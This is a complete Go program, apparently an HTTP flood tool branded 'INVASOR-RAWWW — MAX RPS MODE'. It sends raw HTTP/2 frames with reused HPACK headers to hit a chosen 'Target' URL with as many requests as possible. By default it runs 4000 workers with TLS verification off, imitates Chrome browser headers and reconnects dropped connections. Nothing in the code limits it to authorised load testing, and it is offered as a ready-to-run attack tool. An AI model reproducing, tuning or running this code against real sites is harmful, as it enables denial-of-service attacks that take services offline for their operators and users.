package main

import (
	"bufio"
	"bytes"
	"context"
	"crypto/tls"
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/net/http2/hpack"
)

// ─── HTTP/2 Frame Constants ───
const (
	h2ClientPreface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

	frameData         byte = 0x0
	frameHeaders      byte = 0x1
	frameRSTStream    byte = 0x3
	frameSettings     byte = 0x4
	framePing         byte = 0x6
	frameGoAway       byte = 0x7
	frameWindowUpdate byte = 0x8
	frameContinuation byte = 0x9

	flagEndStream  byte = 0x1
	flagEndHeaders byte = 0x4
	flagACK        byte = 0x1

	settingHeaderTableSize     uint16 = 0x1
	settingEnablePush          uint16 = 0x2
	settingMaxConcurrentStream uint16 = 0x3
	settingInitialWindowSize   uint16 = 0x4
	settingMaxFrameSize        uint16 = 0x5

	defaultMaxStreams   = 100
	defaultMaxFrameSize = 16384
	defaultWindowSize   = 65535
	largeWindowSize     = 1 << 30 // ~1GB
)

// ─── Stats (cache-line padded) ───
type Stats struct {
	sent  atomic.Int64
	_pad0 [56]byte
	ok    atomic.Int64
	_pad1 [56]byte
	fail  atomic.Int64
}

// ─── Config ───
type Config struct {
	URL        string
	Workers    int
	Conns      int
	Duration   time.Duration
	Method     string
	Body       []byte
	Headers    http.Header
	SkipVerify bool
	ForceHTTP1 bool
}

// ═══════════════════════════════════════════════
//  Raw HTTP/2 Connection — bypass net/http entirely
// ═══════════════════════════════════════════════

type h2Conn struct {
	conn net.Conn
	bw   *bufio.Writer
	br   *bufio.Reader

	writeMu sync.Mutex

	nextStreamID  atomic.Uint32 // odd: 1, 3, 5 ...
	activeStreams atomic.Int32
	maxStreams    int32
	maxFrameSize int32
	alive        atomic.Bool

	// pre-encoded, reused for every request
	headerBlock []byte
	body        []byte
	noBody      bool // GET-like: END_STREAM on HEADERS frame

	stats *Stats
}

// ─── Low-level frame helpers ───

func writeFrameHdr(w *bufio.Writer, length int, ftype, flags byte, streamID uint32) {
	var h [9]byte
	h[0] = byte(length >> 16)
	h[1] = byte(length >> 8)
	h[2] = byte(length)
	h[3] = ftype
	h[4] = flags
	binary.BigEndian.PutUint32(h[5:], streamID&0x7FFFFFFF)
	w.Write(h[:])
}

func writeWinUpdate(w *bufio.Writer, streamID uint32, inc int) {
	writeFrameHdr(w, 4, frameWindowUpdate, 0, streamID)
	var b [4]byte
	binary.BigEndian.PutUint32(b[:], uint32(inc)&0x7FFFFFFF)
	w.Write(b[:])
}

// ─── Dial helper ───

func dialTCP(addr string) (net.Conn, error) {
	d := &net.Dialer{Timeout: 10 * time.Second, KeepAlive: 60 * time.Second}
	c, err := d.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}
	applySocketOpts(c)
	return c, nil
}

// ─── Create raw HTTP/2 connection ───

func newH2Conn(addr string, tlsCfg *tls.Config, headerBlock, body []byte, stats *Stats) (*h2Conn, error) {
	raw, err := dialTCP(addr)
	if err != nil {
		return nil, err
	}

	tc := tls.Client(raw, tlsCfg)
	if err := tc.HandshakeContext(context.Background()); err != nil {
		raw.Close()
		return nil, err
	}
	if tc.ConnectionState().NegotiatedProtocol != "h2" {
		tc.Close()
		return nil, fmt.Errorf("ALPN: got %q, want h2", tc.ConnectionState().NegotiatedProtocol)
	}

	c := &h2Conn{
		conn:        tc,
		bw:          bufio.NewWriterSize(tc, 256*1024),
		br:          bufio.NewReaderSize(tc, 128*1024),
		headerBlock: headerBlock,
		body:        body,
		noBody:      len(body) == 0,
		maxStreams:   defaultMaxStreams,
		maxFrameSize: defaultMaxFrameSize,
		stats:       stats,
	}
	c.nextStreamID.Store(1)
	c.alive.Store(true)

	// ── Connection preface ──
	c.bw.WriteString(h2ClientPreface)

	// ── Our SETTINGS ──
	settings := [][2]uint32{
		{uint32(settingHeaderTableSize), 0},      // don't use dynamic table
		{uint32(settingEnablePush), 0},            // no server push
		{uint32(settingInitialWindowSize), largeWindowSize},
		{uint32(settingMaxFrameSize), defaultMaxFrameSize},
	}
	writeFrameHdr(c.bw, len(settings)*6, frameSettings, 0, 0)
	for _, s := range settings {
		var buf [6]byte
		binary.BigEndian.PutUint16(buf[:2], uint16(s[0]))
		binary.BigEndian.PutUint32(buf[2:], s[1])
		c.bw.Write(buf[:])
	}

	// ── Connection-level WINDOW_UPDATE (stream 0) ──
	writeWinUpdate(c.bw, 0, largeWindowSize-defaultWindowSize)
	c.bw.Flush()

	// ── Read server's SETTINGS and ACK ──
	if err := c.handshake(); err != nil {
		tc.Close()
		return nil, err
	}

	go c.readerLoop()
	go c.flusherLoop()

	return c, nil
}

func (c *h2Conn) handshake() error {
	for i := 0; i < 30; i++ {
		ft, fl, _, payload, err := c.readFrame()
		if err != nil {
			return err
		}
		switch ft {
		case frameSettings:
			if fl&flagACK == 0 {
				c.applySettings(payload)
				writeFrameHdr(c.bw, 0, frameSettings, flagACK, 0)
				c.bw.Flush()
				return nil
			}
		case framePing:
			if fl&flagACK == 0 && len(payload) == 8 {
				writeFrameHdr(c.bw, 8, framePing, flagACK, 0)
				c.bw.Write(payload)
				c.bw.Flush()
			}
		case frameWindowUpdate:
			// ignore
		}
	}
	return fmt.Errorf("server did not send SETTINGS")
}

func (c *h2Conn) applySettings(payload []byte) {
	for len(payload) >= 6 {
		id := binary.BigEndian.Uint16(payload[:2])
		val := binary.BigEndian.Uint32(payload[2:6])
		payload = payload[6:]
		switch id {
		case settingMaxConcurrentStream:
			c.maxStreams = int32(val)
		case settingMaxFrameSize:
			c.maxFrameSize = int32(val)
		}
	}
}

func (c *h2Conn) readFrame() (ftype, flags byte, streamID uint32, payload []byte, err error) {
	var hdr [9]byte
	if _, err = io.ReadFull(c.br, hdr[:]); err != nil {
		return
	}
	length := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
	ftype = hdr[3]
	flags = hdr[4]
	streamID = binary.BigEndian.Uint32(hdr[5:]) & 0x7FFFFFFF
	if length > 0 {
		payload = make([]byte, length)
		_, err = io.ReadFull(c.br, payload)
	}
	return
}

// ─── Reader goroutine: handle server frames, keep conn alive ───

func (c *h2Conn) readerLoop() {
	defer func() {
		c.alive.Store(false)
		c.conn.Close()
	}()

	var winConsumed int64

	for {
		ft, fl, sid, payload, err := c.readFrame()
		if err != nil {
			return
		}

		switch ft {
		case frameSettings:
			if fl&flagACK == 0 {
				c.applySettings(payload)
				c.writeMu.Lock()
				writeFrameHdr(c.bw, 0, frameSettings, flagACK, 0)
				c.bw.Flush()
				c.writeMu.Unlock()
			}

		case framePing:
			if fl&flagACK == 0 && len(payload) == 8 {
				c.writeMu.Lock()
				writeFrameHdr(c.bw, 8, framePing, flagACK, 0)
				c.bw.Write(payload)
				c.bw.Flush()
				c.writeMu.Unlock()
			}

		case frameGoAway:
			return

		case frameHeaders:
			// drain CONTINUATION frames if needed
			if fl&flagEndHeaders == 0 {
				for {
					cft, cfl, _, _, cerr := c.readFrame()
					if cerr != nil {
						return
					}
					if cft != frameContinuation {
						return // protocol error
					}
					if cfl&flagEndHeaders != 0 {
						break
					}
				}
			}
			if fl&flagEndStream != 0 && sid != 0 {
				c.stats.ok.Add(1)
				c.activeStreams.Add(-1)
			}

		case frameData:
			winConsumed += int64(len(payload))
			if winConsumed > 1<<20 { // refill window every ~1MB
				c.writeMu.Lock()
				writeWinUpdate(c.bw, 0, int(winConsumed))
				c.bw.Flush()
				c.writeMu.Unlock()
				winConsumed = 0
			}
			if fl&flagEndStream != 0 && sid != 0 {
				c.stats.ok.Add(1)
				c.activeStreams.Add(-1)
			}

		case frameRSTStream:
			if sid != 0 {
				c.stats.fail.Add(1)
				c.activeStreams.Add(-1)
			}

		case frameWindowUpdate:
			// ignore — we don't track send window
		}
	}
}

// ─── Flusher: batch writes → single syscall ───

func (c *h2Conn) flusherLoop() {
	t := time.NewTicker(800 * time.Microsecond)
	defer t.Stop()
	for range t.C {
		if !c.alive.Load() {
			return
		}
		c.writeMu.Lock()
		c.bw.Flush()
		c.writeMu.Unlock()
	}
}

// ─── Fire a single request (zero-alloc hot path) ───

func (c *h2Conn) sendRequest() bool {
	if !c.alive.Load() {
		return false
	}
	if c.activeStreams.Load() >= c.maxStreams {
		return false
	}
	c.activeStreams.Add(1)

	id := c.nextStreamID.Add(2) - 2
	if id > 0x7FFFFFFE {
		c.alive.Store(false)
		return false
	}

	c.writeMu.Lock()

	if c.noBody {
		// GET-like: single HEADERS frame with END_STREAM + END_HEADERS
		writeFrameHdr(c.bw, len(c.headerBlock), frameHeaders, flagEndStream|flagEndHeaders, id)
		c.bw.Write(c.headerBlock)
	} else {
		// POST-like: HEADERS (END_HEADERS) + DATA (END_STREAM)
		writeFrameHdr(c.bw, len(c.headerBlock), frameHeaders, flagEndHeaders, id)
		c.bw.Write(c.headerBlock)

		maxFr := int(c.maxFrameSize)
		body := c.body
		for len(body) > 0 {
			chunk := body
			if len(chunk) > maxFr {
				chunk = body[:maxFr]
			}
			body = body[len(chunk):]
			fl := byte(0)
			if len(body) == 0 {
				fl = flagEndStream
			}
			writeFrameHdr(c.bw, len(chunk), frameData, fl, id)
			c.bw.Write(chunk)
		}
	}

	c.writeMu.Unlock()
	c.stats.sent.Add(1)
	return true
}

func (c *h2Conn) close() {
	c.alive.Store(false)
	c.conn.Close()
}

// ═══════════════════════════════════════════════
//  HPACK encoder — encode once, replay forever
// ═══════════════════════════════════════════════

func encodeHPACK(method, scheme, authority, path string, headers http.Header) []byte {
	var buf bytes.Buffer
	enc := hpack.NewEncoder(&buf)
	enc.SetMaxDynamicTableSizeLimit(0) // static table only → deterministic bytes

	enc.WriteField(hpack.HeaderField{Name: ":method", Value: method})
	enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
	enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
	enc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})

	for k, vals := range headers {
		for _, v := range vals {
			enc.WriteField(hpack.HeaderField{Name: strings.ToLower(k), Value: v})
		}
	}
	return buf.Bytes()
}

// ═══════════════════════════════════════════════
//  Blaster
// ═══════════════════════════════════════════════

type Blaster struct {
	cfg   *Config
	stats Stats
}

func (b *Blaster) Run() {
	u, err := url.Parse(b.cfg.URL)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Invalid URL: %v\n", err)
		os.Exit(1)
	}

	// HTTP/2 requires TLS
	if u.Scheme != "https" && !b.cfg.ForceHTTP1 {
		fmt.Println("  \033[33m[!] Non-HTTPS, switching to HTTP/1.1\033[0m")
		b.cfg.ForceHTTP1 = true
	}

	ctx, cancel := context.WithTimeout(context.Background(), b.cfg.Duration)
	defer cancel()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	go func() { <-sig; cancel() }()

	proto := "HTTP/2 (raw-frame)"
	if b.cfg.ForceHTTP1 {
		proto = "HTTP/1.1 (raw)"
	}

	fmt.Printf("\n\033[1;36m\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\033[0m\n")
	fmt.Printf("\033[1;36m\u2551         INVASOR-RAWWW \u2014 MAX RPS MODE         \u2551\033[0m\n")
	fmt.Printf("\033[1;36m\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\033[0m\n\n")
	fmt.Printf("  \033[1mTarget  :\033[0m %s\n", b.cfg.URL)
	fmt.Printf("  \033[1mProtocol:\033[0m %s\n", proto)
	fmt.Printf("  \033[1mMethod  :\033[0m %s\n", b.cfg.Method)
	fmt.Printf("  \033[1mWorkers :\033[0m %d\n", b.cfg.Workers)
	fmt.Printf("  \033[1mConns   :\033[0m %d\n", b.cfg.Conns)
	fmt.Printf("  \033[1mDuration:\033[0m %s\n", b.cfg.Duration)
	fmt.Println()

	host := u.Hostname()
	port := u.Port()
	if port == "" {
		if u.Scheme == "https" {
			port = "443"
		} else {
			port = "80"
		}
	}

	addrs, err := net.LookupHost(host)
	if err != nil {
		fmt.Fprintf(os.Stderr, "DNS resolve failed: %v\n", err)
		os.Exit(1)
	}
	addr := net.JoinHostPort(addrs[0], port)

	tlsCfg := &tls.Config{
		InsecureSkipVerify: b.cfg.SkipVerify,
		ServerName:         host,
		MinVersion:         tls.VersionTLS12,
		ClientSessionCache: tls.NewLRUClientSessionCache(b.cfg.Conns * 4),
	}

	if b.cfg.ForceHTTP1 {
		tlsCfg.NextProtos = []string{"http/1.1"}
		b.runH1(ctx, addr, tlsCfg, u)
	} else {
		tlsCfg.NextProtos = []string{"h2"}
		b.runH2(ctx, addr, tlsCfg, u)
	}
}

// ─── HTTP/2 Raw Frame Mode ───

func (b *Blaster) runH2(ctx context.Context, addr string, tlsCfg *tls.Config, u *url.URL) {
	path := u.RequestURI()
	if path == "" {
		path = "/"
	}

	headerBlock := encodeHPACK(b.cfg.Method, u.Scheme, u.Host, path, b.cfg.Headers)

	fmt.Print("\033[33m[*] Establishing HTTP/2 connections...\033[0m\r")

	conns := make([]*h2Conn, 0, b.cfg.Conns)
	var mu sync.Mutex
	var wg sync.WaitGroup
	sem := make(chan struct{}, 32)

	for i := 0; i < b.cfg.Conns; i++ {
		wg.Add(1)
		sem <- struct{}{}
		go func() {
			defer func() { <-sem; wg.Done() }()
			c, err := newH2Conn(addr, tlsCfg, headerBlock, b.cfg.Body, &b.stats)
			if err != nil {
				return
			}
			mu.Lock()
			conns = append(conns, c)
			mu.Unlock()
		}()
	}
	wg.Wait()

	if len(conns) == 0 {
		fmt.Fprintln(os.Stderr, "\nFailed to establish any connections")
		os.Exit(1)
	}

	fmt.Printf("\033[2K\033[32m[\u2713] %d/%d connections ready  (max_concurrent_streams=%d)\033[0m\n\n",
		len(conns), b.cfg.Conns, conns[0].maxStreams)

	start := time.Now()
	numConns := len(conns)

	// Background reconnector
	go func() {
		for ctx.Err() == nil {
			time.Sleep(2 * time.Second)
			for i := 0; i < numConns; i++ {
				if !conns[i].alive.Load() {
					nc, err := newH2Conn(addr, tlsCfg, headerBlock, b.cfg.Body, &b.stats)
					if err == nil {
						conns[i].close()
						conns[i] = nc
					}
				}
			}
		}
	}()

	for i := 0; i < b.cfg.Workers; i++ {
		wg.Add(1)
		go func(preferred int) {
			defer wg.Done()
			idx := preferred % numConns
			done := ctx.Done()

			for {
				select {
				case <-done:
					return
				default:
				}

				if conns[idx].sendRequest() {
					continue
				}

				// current conn full/dead → try others
				sent := false
				for j := 1; j < numConns; j++ {
					alt := (idx + j) % numConns
					if conns[alt].sendRequest() {
						idx = alt
						sent = true
						break
					}
				}
				if !sent {
					runtime.Gosched()
					idx = preferred % numConns
				}
			}
		}(i)
	}

	go b.printStats(ctx, start)
	wg.Wait()
	b.printResult(start)

	for _, c := range conns {
		c.close()
	}
}

// ─── HTTP/1.1 Raw Mode ───

func (b *Blaster) runH1(ctx context.Context, addr string, tlsCfg *tls.Config, u *url.URL) {
	path := u.RequestURI()
	if path == "" {
		path = "/"
	}

	// Pre-build raw HTTP/1.1 request bytes
	var reqBuf bytes.Buffer
	fmt.Fprintf(&reqBuf, "%s %s HTTP/1.1\r\n", b.cfg.Method, path)
	fmt.Fprintf(&reqBuf, "Host: %s\r\n", u.Host)
	for k, vals := range b.cfg.Headers {
		for _, v := range vals {
			fmt.Fprintf(&reqBuf, "%s: %s\r\n", k, v)
		}
	}
	reqBuf.WriteString("Connection: keep-alive\r\n")
	if len(b.cfg.Body) > 0 {
		fmt.Fprintf(&reqBuf, "Content-Length: %d\r\n", len(b.cfg.Body))
	}
	reqBuf.WriteString("\r\n")
	if len(b.cfg.Body) > 0 {
		reqBuf.Write(b.cfg.Body)
	}
	reqData := reqBuf.Bytes()

	fmt.Print("\033[33m[*] Establishing HTTP/1.1 connections...\033[0m\r")

	numWorkers := b.cfg.Workers
	if numWorkers > b.cfg.Conns {
		numWorkers = b.cfg.Conns // HTTP/1.1: 1 conn per worker
	}

	isHTTPS := u.Scheme == "https"
	start := time.Now()
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			var conn net.Conn
			var bw *bufio.Writer
			var br *bufio.Reader

			connect := func() bool {
				if conn != nil {
					conn.Close()
				}
				raw, err := dialTCP(addr)
				if err != nil {
					return false
				}
				if isHTTPS {
					tc := tls.Client(raw, tlsCfg)
					if err := tc.HandshakeContext(context.Background()); err != nil {
						raw.Close()
						return false
					}
					conn = tc
				} else {
					conn = raw
				}
				bw = bufio.NewWriterSize(conn, 32*1024)
				br = bufio.NewReaderSize(conn, 32*1024)
				return true
			}

			if !connect() {
				return
			}
			defer func() {
				if conn != nil {
					conn.Close()
				}
			}()

			done := ctx.Done()
			for {
				select {
				case <-done:
					return
				default:
				}

				if _, err := bw.Write(reqData); err != nil {
					if !connect() {
						time.Sleep(50 * time.Millisecond)
					}
					continue
				}
				if err := bw.Flush(); err != nil {
					if !connect() {
						time.Sleep(50 * time.Millisecond)
					}
					continue
				}
				b.stats.sent.Add(1)

				resp, err := http.ReadResponse(br, nil)
				if err != nil {
					b.stats.fail.Add(1)
					connect()
					continue
				}
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
				b.stats.ok.Add(1)
			}
		}()
	}

	fmt.Printf("\033[2K\033[32m[\u2713] %d workers started\033[0m\n\n", numWorkers)

	go b.printStats(ctx, start)
	wg.Wait()
	b.printResult(start)
}

// ─── Live stats ───

func (b *Blaster) printStats(ctx context.Context, start time.Time) {
	var prevSent int64
	for ctx.Err() == nil {
		time.Sleep(time.Second)
		elapsed := time.Since(start)
		curSent := b.stats.sent.Load()
		curOK := b.stats.ok.Load()
		curFail := b.stats.fail.Load()
		rps := float64(curSent - prevSent)
		prevSent = curSent
		fmt.Printf("\r\033[2K\033[1;32m RPS: %8.0f\033[0m | Sent: \033[33m%9d\033[0m | OK: \033[32m%9d\033[0m | Fail: \033[31m%7d\033[0m | %ds/%ds",
			rps, curSent, curOK, curFail,
			int(elapsed.Seconds()), int(b.cfg.Duration.Seconds()))
	}
}

func (b *Blaster) printResult(start time.Time) {
	elapsed := time.Since(start)
	totalSent := b.stats.sent.Load()
	totalOK := b.stats.ok.Load()
	totalFail := b.stats.fail.Load()
	avgRPS := float64(totalSent) / elapsed.Seconds()
	successPct := 0.0
	if totalSent > 0 {
		successPct = float64(totalOK) / float64(totalSent) * 100
	}

	fmt.Printf("\n\n\033[1;36m\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 RESULT \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\033[0m\n")
	fmt.Printf("\033[1;36m\u2502\033[0m  Duration   : %-32.2fs\033[1;36m\u2502\033[0m\n", elapsed.Seconds())
	fmt.Printf("\033[1;36m\u2502\033[0m  Total Sent : %-32d\033[1;36m\u2502\033[0m\n", totalSent)
	fmt.Printf("\033[1;36m\u2502\033[0m  Success    : %-21d \033[32m(%.1f%%)\033[0m       \033[1;36m\u2502\033[0m\n", totalOK, successPct)
	fmt.Printf("\033[1;36m\u2502\033[0m  Failed     : %-32d\033[1;36m\u2502\033[0m\n", totalFail)
	fmt.Printf("\033[1;36m\u2502\033[0m  Avg RPS    : \033[1;32m%-32.0f\033[0m\033[1;36m\u2502\033[0m\n", avgRPS)
	fmt.Printf("\033[1;36m\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\033[0m\n\n")
}

// ─── main ───

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	debug.SetGCPercent(800)
	debug.SetMemoryLimit(2 << 30) // 2GB soft limit

	urlFlag := flag.String("url", "", "Target URL (required)")
	workersFlag := flag.Int("workers", 4000, "Goroutine workers")
	connsFlag := flag.Int("conns", 64, "HTTP/2 connections (h1: also = max workers)")
	durationFlag := flag.Duration("duration", 30*time.Second, "Duration (e.g. 30s, 2m)")
	methodFlag := flag.String("method", "GET", "HTTP method")
	bodyFlag := flag.String("body", "", "Request body")
	headersFlag := flag.String("headers", "", "Headers: Key:Value,Key2:Value2")
	skipVerifyFlag := flag.Bool("skip-verify", true, "Skip TLS verification")
	http1Flag := flag.Bool("http1", false, "Force HTTP/1.1 instead of HTTP/2")
	flag.Parse()

	if *urlFlag == "" {
		fmt.Fprintln(os.Stderr, "Error: -url is required")
		flag.Usage()
		os.Exit(1)
	}

	headers := make(http.Header)
	headers["user-agent"] = []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"}
	headers["accept"] = []string{"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"}
	headers["accept-language"] = []string{"en-US,en;q=0.9"}
	headers["accept-encoding"] = []string{"gzip, deflate, br"}
	headers["sec-fetch-dest"] = []string{"document"}
	headers["sec-fetch-mode"] = []string{"navigate"}
	headers["sec-fetch-site"] = []string{"none"}
	headers["upgrade-insecure-requests"] = []string{"1"}

	if *headersFlag != "" {
		for _, h := range strings.Split(*headersFlag, ",") {
			h = strings.TrimSpace(h)
			idx := strings.IndexByte(h, ':')
			if idx > 0 {
				k := strings.ToLower(strings.TrimSpace(h[:idx]))
				v := strings.TrimSpace(h[idx+1:])
				headers[k] = []string{v}
			}
		}
	}

	(&Blaster{cfg: &Config{
		URL:        *urlFlag,
		Workers:    *workersFlag,
		Conns:      *connsFlag,
		Duration:   *durationFlag,
		Method:     strings.ToUpper(*methodFlag),
		Body:       []byte(*bodyFlag),
		Headers:    headers,
		SkipVerify: *skipVerifyFlag,
		ForceHTTP1: *http1Flag,
	}}).Run()
}
